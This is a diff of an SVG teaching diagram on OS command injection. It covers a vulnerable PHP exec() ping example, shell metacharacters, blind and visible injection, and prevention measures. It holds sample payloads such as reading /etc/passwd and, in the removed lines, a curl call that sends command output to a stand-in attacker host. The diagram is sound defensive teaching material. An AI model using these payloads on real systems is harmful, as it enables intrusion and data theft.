@@ -34,43 +34,33 @@
         --info-accent: #2f253b;
       }
     </style>
-    <!-- Gradients -->
     <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
       <stop offset="0%" stop-color="#7493b3"/>
       <stop offset="100%" stop-color="#3d5a7d"/>
     </linearGradient>
-
     <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
       <stop offset="0%" stop-color="#ffffff"/>
       <stop offset="100%" stop-color="#c4cdd6"/>
     </linearGradient>
-
     <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
       <stop offset="0%" stop-color="#94b384"/>
       <stop offset="100%" stop-color="#5a7a4d"/>
     </linearGradient>
-
     <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
       <stop offset="0%" stop-color="#dba868"/>
       <stop offset="100%" stop-color="#9c6e2e"/>
     </linearGradient>
-
     <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
       <stop offset="0%" stop-color="#bd7d75"/>
       <stop offset="100%" stop-color="#7d3f38"/>
     </linearGradient>
-
     <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
       <stop offset="0%" stop-color="#9384a5"/>
       <stop offset="100%" stop-color="#574a68"/>
     </linearGradient>
-
-    <!-- Drop shadow -->
     <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
       <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#00000044"/>
     </filter>
-
-    <!-- Arrow markers -->
     <marker id="arrow" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
       <path d="M1,2 L9,5 L1,8 Z" fill="#555555"/>
     </marker>
@@ -92,102 +82,73 @@
     <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
       <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
     </marker>
-
-    <linearGradient id="grad-accent" x1="0" y1="0" x2="0" y2="1">
-      <stop offset="0%" stop-color="#1e88e5" />
-      <stop offset="100%" stop-color="#1565c0" />
-    </linearGradient>
   </defs>
-  <rect x="40" y="49.062547" width="206.557377" height="117.812554" rx="6.518573" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="143.278689" y="76.250077" font-size="13.217819" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle" font-family="Arial, sans-serif">Attacker Input</text>
-  <text x="59.672131" y="99.812521" font-size="11.329714" fill="var(--text-muted)" font-family="Courier New, monospace">127.0.0.1; whoami</text>
-  <text x="59.672131" y="117.937616" font-size="11.329714" fill="var(--text-muted)" font-family="Courier New, monospace">| cat /etc/passwd</text>
-  <text x="59.672131" y="136.062598" font-size="11.329714" fill="var(--text-muted)" font-family="Courier New, monospace">&amp;&amp; id</text>
-  <text x="59.672131" y="156.000067" font-size="11.329714" fill="var(--text-muted)" font-family="Courier New, monospace">`ls -la`</text>
-  <line x1="246.557377" y1="107.968768" x2="315.409836" y2="107.968768" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
-  <text x="280.983502" y="98.906333" font-size="10.864288" fill="var(--danger-accent)" text-anchor="middle" font-family="Arial, sans-serif">HTTP GET/POST</text>
-  <rect x="315.409836" y="40" width="265.57377" height="154.062407" rx="6.518573" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
-  <rect x="315.409836" y="40" width="265.57377" height="32.624991" rx="6.518573" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
-  <rect x="315.409836" y="61.750069" width="265.57377" height="10.875034" fill="url(#grad-warn)" rx="6.518573" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="448.196721" y="60.843882" font-size="14.162034" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">Web Application</text>
-  <text x="335.081967" y="90.750086" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">$host = $_GET['host'];</text>
-  <text x="335.081967" y="107.062581" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">$cmd = "ping -c 1 " . $host;</text>
-  <text x="335.081967" y="123.375077" font-size="10.864288" fill="var(--danger-accent)" font-family="Courier New, monospace">exec($cmd, $output);</text>
-  <text x="335.081967" y="144.218846" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">No sanitisation!</text>
-  <text x="335.081967" y="160.531341" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">Unsanitised input → shell string</text>
-  <line x1="580.983607" y1="117.031316" x2="649.836066" y2="117.031316" stroke="var(--text-muted)" stroke-width="2" marker-end="url(#arrow)" />
-  <text x="615.409836" y="107.968768" font-size="10.864288" fill="var(--text-muted)" text-anchor="middle" font-family="Arial, sans-serif">shell call</text>
-  <rect x="649.836066" y="49.062547" width="314.753993" height="154.062407" rx="6.518573" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
-  <rect x="649.836066" y="49.062547" width="314.753993" height="32.624991" rx="6.518573" fill="var(--ok-accent)" />
-  <rect x="649.836066" y="70.812616" width="314.753993" height="10.875034" fill="var(--ok-accent)" rx="6.518573"/>
-  <text x="807.213115" y="69.906317" font-size="14.162034" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">Shell (/bin/sh)</text>
-  <text x="669.508197" y="101.62512" font-size="11.329714" fill="var(--text)" font-family="Courier New, monospace">$ ping -c 1 127.0.0.1; whoami</text>
-  <text x="669.508197" y="123.375077" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">Parsed as TWO commands:</text>
-  <text x="669.508197" y="141.500059" font-size="11.329714" fill="var(--ok-accent)" font-family="Courier New, monospace">  ping -c 1 127.0.0.1</text>
-  <text x="669.508197" y="157.812554" font-size="11.329714" fill="var(--danger-accent)" font-family="Courier New, monospace">  whoami              ← injected!</text>
-  <text x="669.508197" y="190.437545" font-size="10.864288" fill="var(--text-muted)" font-family="Arial, sans-serif">Runs as web server user (www-data/apache)</text>
-  <line x1="964.590164" y1="126.093863" x2="1033.442518" y2="126.093863" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)" />
-  <text x="999.016289" y="117.031316" font-size="10.864288" fill="var(--danger-accent)" text-anchor="middle" font-family="Arial, sans-serif">syscall</text>
-  <rect x="1033.442518" y="67.18753" width="206.557377" height="99.68746" rx="6.518573" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="1136.721311" y="97.093734" font-size="13.217819" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle" font-family="Arial, sans-serif">OS</text>
-  <text x="1136.721311" y="117.031316" font-size="12.273821" fill="var(--danger-accent)" text-anchor="middle" font-family="Courier New, monospace">www-data</text>
-  <text x="1136.721311" y="136.968898" font-size="11.329714" fill="var(--text-muted)" text-anchor="middle" font-family="Arial, sans-serif">output returned</text>
-  <text x="1136.721311" y="153.281393" font-size="11.329714" fill="var(--text-muted)" text-anchor="middle" font-family="Arial, sans-serif">to attacker</text>
-  <rect x="40" y="221.250049" width="580.327764" height="181.249937" rx="6.518573" fill="var(--surface)" stroke="var(--border)" stroke-width="1" />
-  <text x="330.163934" y="246.62498" font-size="14.162034" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle" font-family="Arial, sans-serif">Shell Metacharacters Used in Injection</text>
-  <rect x="59.672131" y="257.500014" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
-  <text x="89.180328" y="274.718809" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">;</text>
-  <text x="123.606557" y="274.718809" font-size="12.273821" fill="var(--text)" font-family="Arial, sans-serif">Command separator — always runs next command</text>
-  <rect x="59.672131" y="286.500031" width="545.901639" height="25.375043" rx="6.518573" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="89.180328" y="303.718714" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">|</text>
-  <text x="123.606557" y="303.718714" font-size="12.273821" fill="var(--text)" font-family="Arial, sans-serif">Pipe — stdout of cmd1 becomes stdin of cmd2</text>
-  <rect x="59.672131" y="315.500048" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
-  <text x="89.180328" y="332.718843" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">&amp;&amp;</text>
-  <text x="123.606557" y="332.718843" font-size="12.273821" fill="var(--text)" font-family="Arial, sans-serif">AND — cmd2 only if cmd1 succeeds (exit 0)</text>
-  <rect x="59.672131" y="344.499952" width="545.901639" height="25.375043" rx="6.518573" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="89.180328" y="361.718747" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">||</text>
-  <text x="123.606557" y="361.718747" font-size="12.273821" fill="var(--text)" font-family="Arial, sans-serif">OR — cmd2 only if cmd1 fails</text>
-  <rect x="59.672131" y="373.500082" width="545.901639" height="25.375043" rx="6.518573" fill="var(--surface)" />
-  <text x="89.180328" y="390.718652" font-size="12.273821" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">` `  or $( )</text>
-  <text x="172.786885" y="390.718652" font-size="12.273821" fill="var(--text)" font-family="Arial, sans-serif">Backticks / subshell — command substitution</text>
-  <rect x="649.836066" y="221.250049" width="590.163934" height="181.249937" rx="6.518573" fill="var(--surface)" stroke="var(--border)" stroke-width="1" />
-  <text x="944.917928" y="246.62498" font-size="14.162034" font-weight="bold" fill="var(--text)" text-anchor="middle" font-family="Arial, sans-serif">Blind vs Visible Injection</text>
-  <rect x="669.508197" y="257.500014" width="255.737705" height="131.406263" rx="6.518573" fill="url(#grad-primary)" stroke="var(--primary-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="797.377049" y="278.343783" font-size="12.273821" font-weight="bold" fill="var(--primary-accent)" text-anchor="middle" font-family="Arial, sans-serif">Visible (In-Band)</text>
-  <text x="689.180328" y="298.281253" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">Output appears in response</text>
-  <text x="689.180328" y="316.406348" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">; cat /etc/passwd</text>
-  <text x="689.180328" y="334.531217" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">Response contains file content</text>
-  <text x="689.180328" y="352.6562" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">Easiest to exploit</text>
-  <text x="689.180328" y="370.781295" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">Confirm with: echo 1234567890</text>
-  <rect x="964.590164" y="257.500014" width="255.737705" height="131.406263" rx="6.518573" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="1092.459016" y="278.343783" font-size="12.273821" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle" font-family="Arial, sans-serif">Blind (Out-of-Band)</text>
-  <text x="984.262295" y="298.281253" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">No output in response</text>
-  <text x="984.262295" y="316.406348" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">; sleep 5</text>
-  <text x="984.262295" y="334.531217" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">Time-based detection</text>
-  <text x="984.262295" y="352.6562" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">; curl attacker.com/$(id)</text>
-  <text x="984.262295" y="370.781295" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">DNS/HTTP out-of-band exfil</text>
-  <rect x="40" y="429.687516" width="1199.999895" height="190.312484" rx="6.518573" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
-  <text x="640" y="455.062559" font-size="15.106141" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle" font-family="Arial, sans-serif">Prevention</text>
-  <rect x="59.672131" y="465.937481" width="344.262295" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
-  <text x="231.803279" y="486.78125" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle" font-family="Arial, sans-serif">Avoid shell execution</text>
-  <text x="79.344262" y="506.718719" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">• Use language APIs not shell commands</text>
-  <text x="79.344262" y="524.843702" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">subprocess.run(['ping','-c','1',host])</text>
-  <text x="79.344262" y="542.968684" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">  (list form — no shell interpretation)</text>
-  <text x="79.344262" y="561.093779" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">• Never pass user input to exec/system</text>
-  <text x="79.344262" y="579.218649" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">• Use whitelists, not blacklists</text>
-  <text x="79.344262" y="595.531144" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">• Reject inputs not matching regex pattern</text>
-  <rect x="433.442623" y="465.937481" width="373.770492" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
-  <text x="620.327869" y="486.78125" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle" font-family="Arial, sans-serif">Sanitise if shell is unavoidable</text>
-  <text x="453.114754" y="506.718719" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">escapeshellarg($input)   # PHP</text>
-  <text x="453.114754" y="524.843702" font-size="10.864288" fill="var(--text-muted)" font-family="Courier New, monospace">shlex.quote(input)       # Python</text>
-  <text x="453.114754" y="542.968684" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">• Wrap input in single quotes</text>
-  <text x="453.114754" y="561.093779" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">• Escape: ; | &amp; ` $ &gt; &lt; ! \</text>
-  <text x="453.114754" y="579.218649" font-size="11.329714" fill="var(--text-muted)" font-family="Arial, sans-serif">• Drop non-alphanumeric chars</text>
-  <rect x="836.721311" y="465.937481" width="383.606557" height="135.937424" rx="6.518573" fill="var(--bg)" stroke="var(--ok-border)" stroke-width="0.8889" />
-  <text x="1028.52459" y="486.78125" font-size="12.273821" font-weight="bold" fill="var(--ok-accent)" text-anchor="middle" font-family="Arial, sans-serif">Defence-in-depth</text>
-  <text x="856.393338" y="506.718719" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">• Run web server as low-privilege user</text>
-  <text x="856.393338" y="524.843702" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">• Use WAF rules to block metacharacters</text>
-  <text x="856.393338" y="542.968684" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">• AppArmor / SELinux mandatory access</text>
-  <text x="856.393338" y="561.093779" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">• Containers: restrict /bin and /usr/bin</text>
-  <text x="856.393338" y="579.218649" font-size="11.329714" fill="var(--text)" font-family="Arial, sans-serif">• Log all exec() / system() calls</text>
+
+  <!-- Flow row -->
+  <rect x="40" y="40" width="227.586206896552" height="139.62962962963" rx="10.540925533895" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="153.793103448276" y="77.592592592593" font-size="17.919573407621" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">Attacker Input</text>
+  <text x="60.689655172414" y="109.814814814815" font-size="14.757295747452" fill="var(--bg)" font-family="Courier New, monospace">; whoami</text>
+  <text x="60.689655172414" y="136.666666666667" font-size="14.757295747452" fill="var(--bg)" font-family="Courier New, monospace">| cat /etc/passwd</text>
+  <text x="60.689655172414" y="163.518518518519" font-size="14.757295747452" fill="var(--bg)" font-family="Courier New, monospace">`id`</text>
+
+  <line x1="272.758620689655" y1="109.814814814815" x2="314.137931034483" y2="109.814814814815" stroke="var(--text)" stroke-width="2" marker-end="url(#arrow)"/>
+
+  <rect x="319.310344827586" y="40" width="289.655172413793" height="139.62962962963" rx="10.540925533895" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="464.137931034483" y="77.592592592593" font-size="17.919573407621" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">Vulnerable App</text>
+  <text x="340" y="109.814814814815" font-size="13.703203194063" fill="var(--bg)" font-family="Courier New, monospace">$cmd = "ping " . $host;</text>
+  <text x="340" y="136.666666666667" font-size="13.703203194063" fill="var(--bg)" font-family="Courier New, monospace">exec($cmd);</text>
+  <text x="340" y="168.888888888889" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">no sanitisation</text>
+
+  <line x1="614.137931034483" y1="109.814814814815" x2="655.51724137931" y2="109.814814814815" stroke="var(--text)" stroke-width="2" marker-end="url(#arrow)"/>
+
+  <rect x="660.689655172414" y="40" width="289.655172413793" height="139.62962962963" rx="10.540925533895" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="805.51724137931" y="77.592592592593" font-size="17.919573407621" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">Shell /bin/sh</text>
+  <text x="681.379310344828" y="109.814814814815" font-size="13.703203194063" fill="var(--bg)" font-family="Courier New, monospace">ping 127.0.0.1; whoami</text>
+  <text x="681.379310344828" y="142.037037037037" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">two commands parsed</text>
+  <text x="681.379310344828" y="168.888888888889" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">runs as www-data</text>
+
+  <line x1="955.51724137931" y1="109.814814814815" x2="996.896551724138" y2="109.814814814815" stroke="var(--text)" stroke-width="2" marker-end="url(#arrow)"/>
+
+  <rect x="1002.068965517241" y="40" width="237.931034482759" height="139.62962962963" rx="10.540925533895" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="1121.034482758621" y="82.962962962963" font-size="17.919573407621" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">OS Compromise</text>
+  <text x="1121.034482758621" y="125.925925925926" font-size="14.757295747452" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">output exfiltrated</text>
+  <text x="1121.034482758621" y="158.148148148148" font-size="14.757295747452" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">RCE achieved</text>
+
+  <!-- metacharacters -->
+  <rect x="40" y="201.111111111111" width="600" height="204.074074074074" rx="10.540925533895" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+  <text x="340" y="233.333333333333" font-size="17.919573407621" font-weight="bold" fill="var(--danger-accent)" text-anchor="middle" font-family="Arial, sans-serif">Shell Metacharacters</text>
+  <text x="71.034482758621" y="270.925925925926" font-size="15.811388300842" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">;</text>
+  <text x="143.448275862069" y="270.925925925926" font-size="14.757295747452" fill="var(--text)" font-family="Arial, sans-serif">separator</text>
+  <text x="71.034482758621" y="303.148148148148" font-size="15.811388300842" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">|</text>
+  <text x="143.448275862069" y="303.148148148148" font-size="14.757295747452" fill="var(--text)" font-family="Arial, sans-serif">pipe</text>
+  <text x="71.034482758621" y="335.37037037037" font-size="15.811388300842" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">&amp;&amp;  ||</text>
+  <text x="205.51724137931" y="335.37037037037" font-size="14.757295747452" fill="var(--text)" font-family="Arial, sans-serif">conditional chain</text>
+  <text x="71.034482758621" y="367.592592592593" font-size="15.811388300842" fill="var(--danger-accent)" font-weight="bold" font-family="Courier New, monospace">` `  $( )</text>
+  <text x="205.51724137931" y="367.592592592593" font-size="14.757295747452" fill="var(--text)" font-family="Arial, sans-serif">command substitution</text>
+
+  <!-- blind vs visible -->
+  <rect x="660.689655172414" y="201.111111111111" width="579.310344827586" height="204.074074074074" rx="10.540925533895" fill="var(--surface)" stroke="var(--border)" stroke-width="1"/>
+  <text x="950.344827586207" y="233.333333333333" font-size="17.919573407621" font-weight="bold" fill="var(--text)" text-anchor="middle" font-family="Arial, sans-serif">Blind vs Visible</text>
+  <text x="681.379310344828" y="270.925925925926" font-size="15.811388300842" font-weight="bold" fill="var(--primary-accent)" font-family="Arial, sans-serif">Visible</text>
+  <text x="681.379310344828" y="297.777777777778" font-size="13.703203194063" fill="var(--text-muted)" font-family="Courier New, monospace">; cat /etc/passwd</text>
+  <text x="681.379310344828" y="324.62962962963" font-size="14.757295747452" fill="var(--text)" font-family="Arial, sans-serif">output in response</text>
+  <text x="950.344827586207" y="270.925925925926" font-size="15.811388300842" font-weight="bold" fill="var(--danger-accent)" font-family="Arial, sans-serif">Blind</text>
+  <text x="950.344827586207" y="297.777777777778" font-size="13.703203194063" fill="var(--text-muted)" font-family="Courier New, monospace">; sleep 5</text>
+  <text x="950.344827586207" y="324.62962962963" font-size="14.757295747452" fill="var(--text)" font-family="Arial, sans-serif">time / DNS exfil</text>
+
+  <!-- Prevention -->
+  <rect x="40" y="426.666666666667" width="1200" height="193.333333333333" rx="10.540925533895" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
+  <text x="640" y="458.888888888889" font-size="18.97366596101" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">Prevention</text>
+  <text x="71.034482758621" y="496.481481481482" font-size="15.811388300842" font-weight="bold" fill="var(--bg)" font-family="Arial, sans-serif">Avoid shell</text>
+  <text x="71.034482758621" y="523.333333333333" font-size="13.703203194063" fill="var(--bg)" font-family="Courier New, monospace">subprocess.run([...])</text>
+  <text x="71.034482758621" y="550.185185185185" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">whitelist inputs</text>
+  <text x="71.034482758621" y="577.037037037037" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">regex-validate</text>
+  <text x="443.448275862069" y="496.481481481482" font-size="15.811388300842" font-weight="bold" fill="var(--bg)" font-family="Arial, sans-serif">Sanitise</text>
+  <text x="443.448275862069" y="523.333333333333" font-size="13.703203194063" fill="var(--bg)" font-family="Courier New, monospace">escapeshellarg / shlex.quote</text>
+  <text x="443.448275862069" y="550.185185185185" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">quote arguments</text>
+  <text x="443.448275862069" y="577.037037037037" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">strip metachars</text>
+  <text x="857.241379310345" y="496.481481481482" font-size="15.811388300842" font-weight="bold" fill="var(--bg)" font-family="Arial, sans-serif">Defence-in-depth</text>
+  <text x="857.241379310345" y="523.333333333333" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">low-privilege user</text>
+  <text x="857.241379310345" y="550.185185185185" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">WAF, AppArmor</text>
+  <text x="857.241379310345" y="577.037037037037" font-size="14.757295747452" fill="var(--bg)" font-family="Arial, sans-serif">audit exec calls</text>
 </svg>
